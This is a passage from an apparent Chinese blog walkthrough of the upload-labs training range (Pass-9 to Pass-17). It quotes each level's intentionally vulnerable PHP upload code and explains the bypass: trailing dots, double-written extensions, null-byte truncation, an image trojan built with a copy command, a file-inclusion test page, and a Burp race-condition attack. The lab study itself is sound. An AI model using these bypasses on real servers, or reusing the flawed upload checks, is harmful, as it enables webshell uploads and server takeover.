string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>黑名单限制，咋一看好像可以绕过的都被限制了，但是仔细看最后拼接的文件名是处理后的文件名，所以可以上传”1.php. .”，经过处理后的文件名就变成”1.php.”，最后由于windows特性会将<strong>“.”</strong>自动去除来绕过</p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10-双写绕过"></a>Pass-10-双写绕过</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$deny_ext</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>只对文件后缀名进行一次过滤，双写文件名绕过。</p><p>所以用双写绕过，构造**.pphphp<strong>去除php后就变成</strong>.php**</p><p><img src="/2020/11/16/upload-labs/image-20201118221712511.png" alt="image-20201118221712511" loading="lazy"></p><h2 id="Pass-11-00截断"><a href="#Pass-11-00截断" class="headerlink" title="Pass-11-00截断"></a>Pass-11-00截断</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code>     </p><p>白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//%00截断适用条件</span><span class="token constant">PHP</span> 版本 <span class="token operator">&lt;</span> <span class="token number">5.3</span><span class="token number">.4</span>php<span class="token punctuation">.</span>ini 中 magic_quotes_gpc<span class="token operator">=</span>off<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Pass-12-00截断"><a href="#Pass-12-00截断" class="headerlink" title="Pass-12-00截断"></a>Pass-12-00截断</h2><p>看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"上传失败"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p><code>$img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></p><p>对比发现save_path参数由原来的GET方式传递变成了POST方式传递</p><p>还是使用00截断，但不能再使用%00截断, 因为%00截断在 GET 中被 url 解码之后是空字符，但是在 POST 中%00不会被 url 解码, 所以通过burp修改hex值为00进行截断</p><h2 id="Pass-13-图片马"><a href="#Pass-13-图片马" class="headerlink" title="Pass-13-图片马"></a>Pass-13-图片马</h2><p>可以看到关卡要求使用图片马</p><p>可以使用以下CMD命令制作图片马</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">copy 1.jpg &#x2F;b + 1.php &#x2F;a shell.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接上传即可</p><p>直接访问图片并不能把图片当做PHP解析，因此还需要利用文件包含漏洞（）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">##include.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Pass-14-getimagesize-图片马"><a href="#Pass-14-getimagesize-图片马" class="headerlink" title="Pass-14-getimagesize()-图片马"></a>Pass-14-getimagesize()-图片马</h2><p>发现多了一个getimagesize函数，getimagesize就是个获取图片信息的文件。同样我们也可以通过上面的方法绕过,也成功解析</p><h2 id="Pass-15-exif-imagetype-图片马"><a href="#Pass-15-exif-imagetype-图片马" class="headerlink" title="Pass-15-exif_imagetype()-图片马"></a>Pass-15-exif_imagetype()-图片马</h2><p>发现开启了php_exif模块检测文件信息<br>用上面的文件包含依然可以解析图片</p><h2 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16-二次渲染绕过"></a>Pass-16-二次渲染绕过</h2><p>参考：<a href="https://xz.aliyun.com/t/2657#toc-13">upload-labs之pass 16详细分析</a></p><h2 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17-条件竞争"></a>Pass-17-条件竞争</h2><p>看源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$upload_file</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里是先move_uploaded_file函数将上传文件临时保存，再进行判断，如果不在白名单里则unlink删除，在的话就rename重命名，所以这里存在条件竞争。</p><p>可以使用条件竞争进行绕过</p><p>我们上传的文件是有缓存的，move_uploaded_file(a,b)就是把a移到b，所以move_uploaded_file($temp_file, $upload_file)就是把缓存移动到UPLOAD_PATH . ‘/’ . $file_name，紧接着会判断我们的文件的后缀了，如果不是规定的后缀就会被unlink(删除)。</p><p>条件竞争就是我们不断传上去php木马文件，在被移动到UPLOAD_PATH . ‘/’ . $file_name之后，在没有来得及被unlink处理之前去访问这个文件。</p><p>用burp抓包开启两个intruder模块，一个用于重复上传，另一个用于重复访问。</p><p>因为没有什么参数需要爆破，只是需要重复发起请求，所以payload设置为Null payloads,设置访问次数5000次，线程50个</p><p><img src="/2020/11/16/upload-labs/image-20201121114724061.png" alt="image-20201121114724061" loading="lazy"></p><p>最后发现好几个成功</p><p><img src="/2020/11/16/upload-labs/image-20201121114247275.png" alt="image-20201121114247275" 